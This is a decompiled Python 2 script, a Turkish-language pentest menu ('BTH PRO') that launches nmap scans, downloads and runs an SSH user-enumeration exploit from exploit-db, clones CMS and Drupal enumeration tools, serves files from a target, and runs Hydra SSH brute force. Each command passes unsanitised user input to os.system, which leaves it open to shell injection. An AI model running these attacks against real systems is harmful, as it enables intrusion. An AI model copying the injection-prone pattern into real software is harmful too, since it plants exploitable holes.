# uncompyle6 version 3.6.1
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
# [GCC 9.2.1 20191008]
# Embedded file name: BTH_PRO.py
# Compiled at: 2019-05-16 22:10:07
import os
os.system('apt-get install figlet')
os.system('clear')
os.system('figlet BTH PRO V1.2')
yesil = '\x1b[32m'
print "\nBu Ara\xc3\xa7 BirkanTekkan'\xc4\xb1n Takip\xc3\xa7ileri \xc4\xb0\xc3\xa7in Haz\xc4\xb1rlad\xc4\xb1\xc4\x9f\xc4\xb1 PenTest Ara\xc3\xa7lar\xc4\xb1n\xc4\xb1 Bar\xc4\xb1nd\xc4\xb1ran Bir Projedir. Bu Proje Kendi Sistemlerinize PenTest Uygulaman\xc4\xb1z \xc4\xb0\xc3\xa7in Geli\xc5\x9ftirilmi\xc5\x9ftir. Ama\xc3\xa7 D\xc4\xb1\xc5\x9f\xc4\xb1 Kullan\xc4\xb1mdan Do\xc4\x9facak Olan Sorumluluk Tamamen Kullan\xc4\xb1c\xc4\xb1ya Aittir.\n\n\n1) Bilgi Toplama\n2) G\xc3\xbcvenlik A\xc3\xa7\xc4\xb1\xc4\x9f\xc4\xb1 Analizi\n3) G\xc3\xbcvenlik A\xc3\xa7\xc4\xb1\xc4\x9f\xc4\xb1 \xc4\xb0stismar\xc4\xb1\n4) \xc4\xb0stismar Sonras\xc4\xb1\n5) Parola Sald\xc4\xb1r\xc4\xb1lar\xc4\xb1\n6) Koklama & S\xc4\xb1zd\xc4\xb1rma\n7) Ak\xc4\xb1ll\xc4\xb1 Telefon Pentest\n8) Kablosuz A\xc4\x9f Pentest\n9) Ara\xc3\xa7 Ekle\n10) Sorun Bildir\n\n"
secim = raw_input('Se\xc3\xa7im : ')
if secim == '1':
    os.system('clear')
    os.system('figlet BILGI TOPLAMA')
    print '\n\t1) Port Tarama (NMAP)\n\t2) SSH Enumerate (ssh_enum.py)\n\t3) \xc4\xb0\xc3\xa7erik Y\xc3\xb6netim Sistemi(CMS) Tespit (CMSEEK)\n\t4) Drupal Enumerate (DRUPWN, DROOPESCAN)\n\t'
    btsecim = raw_input('BTSe\xc3\xa7im : ')
    if btsecim == '1':
        os.system('apt-get install nmap')
        os.system('clear')
        os.system('figlet PORT TARAMA')
        print '\n\nBu Ad\xc4\xb1mda NMAP Arac\xc4\xb1 Kullan\xc4\xb1larak Port Taramas\xc4\xb1 Ger\xc3\xa7ekle\xc5\x9ftirilir ve Elde Edilen B\xc3\xbct\xc3\xbcn Sonu\xc3\xa7lar TXT Dosyalar\xc4\xb1na Kaydedilir. Sizden \xc4\xb0steden Sadece "Hedef IP/Domain" Bilgisidir. Ama\xc3\xa7 D\xc4\xb1\xc5\x9f\xc4\xb1 Kullanmak Yasakt\xc4\xb1r. Sadece Kendi Sistemlerinizde Test Edin.\n\n\t\t1) H\xc4\xb1zl\xc4\xb1 Tarama\n\t\t2) TCP/UDP Tarama\n\t\t3) T\xc3\xbcm Portlar Tarama\n\t\t4) \xc4\xb0\xc5\x9fletim Sistemi Tespiti\n\t\t5) Agresif Tarama \n\t\t6) Ayr\xc4\xb1nt\xc4\xb1l\xc4\xb1 Tarama\n\t\t7) Belirli Porta Ayr\xc4\xb1nt\xc4\xb1l\xc4\xb1 Tarama\n\t\t'
        ptsecim = raw_input('PTSe\xc3\xa7im : ')
        if ptsecim == '1':
            hthedefip = raw_input('Hedef IP/Domain : ')
            os.system('nmap -T4 -p 1-65535 -oN hizli_tarama_' + hthedefip + '.txt ' + hthedefip)
            print ''
            print yesil + 'Sonu\xc3\xa7lar Kaydedildi.'
            print ''
        elif ptsecim == '2':
            tuthedefip = raw_input('Hedef IP/Domain : ')
            os.system('nmap -sS -sU -PN -oN tcp_udp_tarama_' + tuthedefip + '.txt ' + tuthedefip)
            print ''
            print yesil + 'Sonu\xc3\xa7lar Kaydedildi.'
            print ''
        elif ptsecim == '3':
            tpthedefip = raw_input('Hedef IP/Domain : ')
            os.system('nmap -sS -sV -sU -PN -p 1-65535 -oN tum_port_tarama_' + tpthedefip + '.txt ' + tpthedefip)
            print ''
            print yesil + 'Sonu\xc3\xa7lar Kaydedildi.'
            print ''
        elif ptsecim == '4':
            ishedefip = raw_input('Hedef IP/Domain : ')
            os.system('nmap -O -oN isletim_sistemi_tarama_' + ishedefip + '.txt ' + ishedefip)
            print ''
            print yesil + 'Sonu\xc3\xa7lar Kaydedildi.'
            print ''
        elif ptsecim == '5':
            athedefip = raw_input('Hedef IP/Domain : ')
            os.system('nmap -T4 -A -oN agresif_tarama_' + athedefip + '.txt ' + athedefip)
            print ''
            print yesil + 'Sonu\xc3\xa7lar Kaydedildi.'
            print ''
        elif ptsecim == '6':
            ahedefip = raw_input('Hedef IP/Domain : ')
            os.system('nmap -T4 -A -v -oN ayrintili_tarama_' + ahedefip + '.txt ' + ahedefip)
            print ''
            print yesil + 'Sonu\xc3\xa7lar Kaydedildi.'
            print ''
        elif ptsecim == '7':
            bphedefip = raw_input('Hedef IP/Domain : ')
            port = raw_input('Hedef Port : ')
            os.system('nmap -A -v -sS -sV -p ' + port + ' -oN belirli_port_tarama_' + bphedefip + ' ' + bphedefip)
            print ''
            print yesil + 'Sonu\xc3\xa7lar Kaydedildi.'
            print ''
    elif btsecim == '2':
        os.system('wget https://www.exploit-db.com/download/45233')
        os.system('clear')
        os.system('mv 45233 ssh_enum.py')
        os.system('figlet SSH ENUM')
        print ''
        print "Bu Ad\xc4\xb1mda 'SSH Enumerate' Ger\xc3\xa7ekle\xc5\x9ftirilerek Verilen Wordlistteki Kelimeler Kontrol Edilir ve Hedef'e Uygun Olan Kullan\xc4\xb1c\xc4\xb1 Ad\xc4\xb1 Tespit Edilir. Sonu\xc3\xa7lar TXT Dosyas\xc4\xb1na Kaydedilir. \xc4\xb0\xc5\x9flem Sonras\xc4\xb1nda 'sonuc.txt' Dosyas\xc4\xb1 \xc4\xb0ncelenir 'is a valid user!' Aran\xc4\xb1r. Bu Ad\xc4\xb1mda Hedef IP/Port ve Wordlist Bilgilerine \xc4\xb0htiya\xc3\xa7 Duyulur."
        print ''
        hedef_ip = raw_input('Hedef IP : ')
        hedef_port = raw_input('Hedef Port : ')
        wordlist = raw_input('Wordlist : ')
        os.system('python ssh_enum.py --port ' + hedef_port + ' --userList ' + wordlist + ' --outputFile sonuc.txt ' + hedef_ip)
        os.system('clear')
        print ''
        print yesil + "Sonu\xc3\xa7lar Kaydedildi. 'sonuc.txt' "
        print ''
    elif btsecim == '3':
        os.system('git clone https://github.com/Tuhinshubhra/CMSeeK')
        os.system('pip3 install -r CMSeeK/requirements.txt')
        os.system('clear')
        os.system('figlet CMS TESPIT')
        hedef_ip = raw_input('Hedef IP/Domain : ')
        os.system('python3 CMSeeK/cmseek.py -u ' + hedef_ip)
    elif btsecim == '4':
        os.system('git clone https://github.com/immunIT/drupwn')
        os.system('python3 drupwn/setup.py install')
        os.system('pip3 install -r drupwn/requirements.txt')
        os.system('pip install droopescan')
        os.system('clear')
        os.system('figlet DRUPAL ENUM')
        print "Bu Ad\xc4\xb1mda 'DRUPWN ve DROOPESCAN' Arac\xc4\xb1 Kullan\xc4\xb1larak Drupal Kullanan Sitelere Enumeration Yap\xc4\xb1l\xc4\xb1r. Bu Ad\xc4\xb1mda Hedef IP/Domain Bilgisi Girerken Ba\xc5\x9f\xc4\xb1na http:// veya https:// da Ekleyin. "
        print ''
        hedef_ip = raw_input('Hedef IP/Domain : ')
        os.system('drupwn --users --themes --modules --dfiles --nodes enum ' + hedef_ip)
        os.system('figlet DROOPESCAN')
        os.system('droopescan scan -u ' + hedef_ip)
elif secim == '4':
    os.system('clear')
    os.system('figlet ISTISMAR SONRASI')
    print '\n\t1) Linux Exploit Kontrol\n\t2) SimpleHttpServer\n\t'
    issecim = raw_input('ISSecim : ')
    if issecim == '1':
        os.system('git clone https://github.com/mzet-/linux-exploit-suggester')
        os.system('mv linux-exploit-suggester/linux-exploit-suggester.sh ./les.sh')
        os.system('rm -rf linux-exploit-suggester.sh')
        os.system('clear')
        os.system('figlet LINUX EXPLOIT KONTROL')
        print "Bu Ad\xc4\xb1mda 'Linux Exploit Suggester' \xc4\xb0simli Ara\xc3\xa7 \xc4\xb0ndirilir ve Masa\xc3\xbcst\xc3\xbcne 'les.sh' Olarak Kaydedilir. Hedef Sunucuda Bu Ara\xc3\xa7 \xc3\x87al\xc4\xb1\xc5\x9ft\xc4\xb1r\xc4\xb1larak Hedef'e Uygun Exploit Olup Olmad\xc4\xb1\xc4\x9f\xc4\xb1 Kontrol Edilir."
        print ''
    if issecim == '2':
        os.system('git clone https://github.com/zqqf16/SimpleHTTPServer')
        os.system('mv SimpleHTTPServer/http.py ./server.py')
        os.system('rm -rf SimpleHTTPServer')
        os.system('clear')
        os.system('figlet HTTP SERVER')
        print 'Bu Ad\xc4\xb1mda HTTP SERVER Ba\xc5\x9flat\xc4\xb1l\xc4\xb1r. Bulundu\xc4\x9fu Dizine Ba\xc5\x9fka Bilgisayarlardan Ba\xc4\x9flan\xc4\xb1labilir Dosya Upload/Download Yap\xc4\xb1labilir. IP : Local/D\xc4\xb1\xc5\x9f - Port : 8000'
        print ''
        print 'D\xc4\xb1\xc5\x9f IP'
        os.system('curl icanhazip.com')
        print ''
        os.system('python server.py')
elif secim == '5':
    os.system('clear')
    os.system('figlet PAROLA SALDIRI')
    print '\n\t1) SSH Brute (HYDRA)\n\t2) Wordlist Olu\xc5\x9ftur (CEWL)\n\t'
    pssecim = raw_input('PSSecim : ')
    if pssecim == '1':
        os.system('apt-get install hydra')
        os.system('clear')
        os.system('figlet SSH BRUTE')
        print ''
        print 'Bu Ad\xc4\xb1mda HYDRA Arac\xc4\xb1 Kullan\xc4\xb1larak SSH Servisine Y\xc3\xb6nelik Kaba Kuvvet Sald\xc4\xb1r\xc4\xb1s\xc4\xb1 Ger\xc3\xa7ekle\xc5\x9ftirilir. Bu Ad\xc4\xb1mda Hedef IP/Kullan\xc4\xb1c\xc4\xb1 Ad\xc4\xb1/Wordlist Bilgilerine \xc4\xb0htiya\xc3\xa7 Duyulur. Ama\xc3\xa7 D\xc4\xb1\xc5\x9f\xc4\xb1 Kullanmak Yasakt\xc4\xb1r. T\xc3\xbcm Sorumluluk Kullanan Ki\xc5\x9fiye Aittir.'
        print ''
        hedef_ip = raw_input('Hedef IP : ')
        kullanici_adi = raw_input('Kullan\xc4\xb1c\xc4\xb1 Ad\xc4\xb1 : ')
        wordlist = raw_input('Wordlist : ')
        os.system('hydra -V -l ' + kullanici_adi + ' -P ' + wordlist + ' ' + hedef_ip + ' ssh')
    elif pssecim == '2':
        os.system('apt-get install cewl')
        os.system('clear')
        os.system('figlet WORDLIST OLUSTUR')
        print ''
        print "Bu Ad\xc4\xb1mda CEWL Arac\xc4\xb1 Kullan\xc4\xb1larak Hedef Web Sitesindeki Kelimeler Toplan\xc4\xb1larak Wordlist Olu\xc5\x9fturulur. Olu\xc5\x9fturulan Wordlist Kullan\xc4\xb1c\xc4\xb1Ad\xc4\xb1/Parola Olarak Kullan\xc4\xb1labilir. Bu Ad\xc4\xb1mda Hedef IP/Domain Bilgisi Yeterlidir. Sonu\xc3\xa7lar 'cewl_wordlist.txt' olarak kaydedilir."
        print ''
        hedef_domain = raw_input('Hedef IP/Domain : ')
        os.system('cewl -d 2 ' + hedef_domain + ' -w ' + hedef_domain + '_wordlist.txt')
        os.system('clear')
        print ''
        print yesil + 'Sonu\xc3\xa7lar Kaydedildi. ' + hedef_domain + '_wordlist'
        print ''
elif secim == '9':
    print '\n\nBu Projeye Ara\xc3\xa7 Ekleme \xc4\xb0ste\xc4\x9finde Bulunabilirsiniz. A\xc5\x9fa\xc4\x9f\xc4\xb1daki Forma Gerekli Bilgileri Doldurman\xc4\xb1z Yeterli. \xc4\xb0ste\xc4\x9finiz \xc4\xb0ncelenir ve Ara\xc3\xa7 Bu Projeye Dahil Edilir.\n\nhttps://forms.gle/iZUrrwSd7dVhRLoL8\n\n\t'
elif secim == '10':
    print '\nBu Projede Kar\xc5\x9f\xc4\xb1la\xc5\x9ft\xc4\xb1\xc4\x9f\xc4\xb1n\xc4\xb1z Sorunlar\xc4\xb1 A\xc5\x9fa\xc4\x9f\xc4\xb1daki Formu Kullanarak Bize Bildirebilirsiniz.\n\nhttps://forms.gle/jHtN2kJZxroXiXBcA\n\n\t'
# okay decompiling pcdunyasi/BTH_PRO_V1.2.pyc
